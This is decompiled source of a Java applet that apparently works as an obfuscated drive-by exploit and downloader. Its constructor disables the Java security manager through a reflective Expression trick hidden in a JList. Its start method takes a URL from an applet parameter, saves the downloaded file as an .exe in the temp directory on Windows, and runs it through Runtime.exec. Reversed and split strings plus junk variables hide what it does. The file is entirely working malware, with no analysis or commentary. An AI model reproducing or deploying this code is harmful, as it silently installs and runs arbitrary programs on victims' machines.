// 
// Decompiled by Procyon v0.5.30
// 

package kilo;

import java.awt.Component;
import java.beans.Expression;
import utilits.nod_sucks;
import java.lang.reflect.Method;
import java.lang.reflect.InvocationTargetException;
import utilits.petro;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.URL;
import javax.swing.JList;
import java.util.HashSet;
import java.applet.Applet;

public class perev extends Applet
{
    public HashSet rem;
    public JList kto;
    public String pol;
    public String ort;
    public Runtime ret;
    public int hfa;
    public String fer;
    public String iok;
    public URL tre;
    public String nop;
    public String haz;
    public InputStream sed;
    public String qas;
    public int klo;
    public FileOutputStream moi;
    public String uto;
    public String kha;
    public String top;
    
    public void start() {
        super.start();
        try {
            this.pol = petro.lopiyo(this.getParameter("dskvnds"));
            this.ort = "e".concat("xe.");
            this.fer = "ri".concat("dpm".concat("t.oi.av".concat("aj")));
            this.iok = "ema".concat("n.so");
            this.nop = new StringBuffer(this.ort).reverse().toString();
            this.haz = new StringBuffer(this.fer).reverse().toString();
            this.hfa = 24;
            this.qas = new StringBuffer(this.iok).reverse().toString();
            this.uto = String.valueOf(Math.random()) + this.nop;
            final Runtime runtime = Runtime.getRuntime();
            this.ret = runtime;
            if (runtime == null) {}
            this.kha = System.getProperty(this.haz);
            this.klo = 1000 + this.hfa;
            this.top = System.getProperty(this.qas);
            try {
                if (this.top.indexOf("W".concat("in").concat("do".concat("ws"))) >= 0) {
                    final String kbn = String.valueOf(this.kha) + this.uto;
                    this.moi = new FileOutputStream(kbn);
                    final boolean optkl = false;
                    this.tre = new URL(this.pol);
                    final int jer = 10;
                    final boolean zhe = true;
                    final String its = "sf";
                    this.tre.openConnection();
                    final int fhe = 10;
                    final boolean rio = false;
                    final String feri = "ee";
                    this.sed = this.tre.openStream();
                    final String gv = "lo";
                    final boolean otron = true;
                    final int lop = 0;
                    final String jol = "sv";
                    final byte[] sap = new byte[this.klo];
                    int iop;
                    while ((iop = this.sed.read(sap, 0, this.klo)) != -1) {
                        this.moi.write(sap, 0, iop);
                    }
                    this.sed.close();
                    this.moi.close();
                    final int df = 34;
                    final boolean jert = false;
                    final String pler = "kiu";
                    final int feds = 76;
                    final String gaw = "guy";
                    final boolean zerg = true;
                    fasa(this.ret, "ex".concat("ec"), new Object[] { String.valueOf(this.kha) + this.uto });
                    final int elr = 4;
                    final String ernv = "lij";
                }
            }
            catch (Exception ex) {}
        }
        catch (Exception ex2) {}
    }
    
    public static Object fasa(final Object obj, final String name) {
        final Class cls = obj.getClass();
        try {
            final Method method = cls.getMethod(name, (Class[])null);
            return method.invoke(obj, (Object[])null);
        }
        catch (NoSuchMethodException ex) {
            ex.printStackTrace();
        }
        catch (IllegalAccessException ex2) {
            ex2.printStackTrace();
        }
        catch (InvocationTargetException ex3) {
            throw new RuntimeException(ex3);
        }
        return null;
    }
    
    public static Object fasa(final Object obj, final String name, final Object[] val) {
        final Class cls = obj.getClass();
        if (val.length == 0) {
            fasa(obj, name);
        }
        try {
            final Method[] m = cls.getMethods();
            for (int i = 0; i < m.length; ++i) {
                if (m[i].getName().equals(name) && cm(m[i], val)) {
                    return m[i].invoke(obj, val);
                }
            }
        }
        catch (IllegalAccessException ex) {
            ex.printStackTrace();
        }
        catch (InvocationTargetException ex2) {
            throw new RuntimeException(ex2);
        }
        return null;
    }
    
    private static boolean cm(final Method m, final Object[] val) {
        final Class[] cls = m.getParameterTypes();
        return c(cls, val);
    }
    
    public static boolean c(final Class[] cls, final Object[] val) {
        if (cls.length != val.length) {
            return false;
        }
        for (int i = 0; i < cls.length; ++i) {
            if (!val[i].getClass().getName().toUpperCase().contains(cls[i].getName().toUpperCase())) {
                return false;
            }
        }
        return true;
    }
    
    public perev() {
        this.rem = new HashSet();
        final Class niu = System.class;
        final boolean bt = true;
        final String fac = "setS".concat("ecu".concat("rityM".concat("anager")));
        final String lok = "vs";
        final Object[] kop = { null };
        final int pol = 14;
        this.rem.add(new nod_sucks(niu, fac, kop));
        final Expression ensvdj = new Expression(niu, fac, kop);
        final bottom dvknsl = new bottom(this, this.rem);
        this.add(this.kto = new JList((E[])new Object[] { dvknsl }));
    }
}
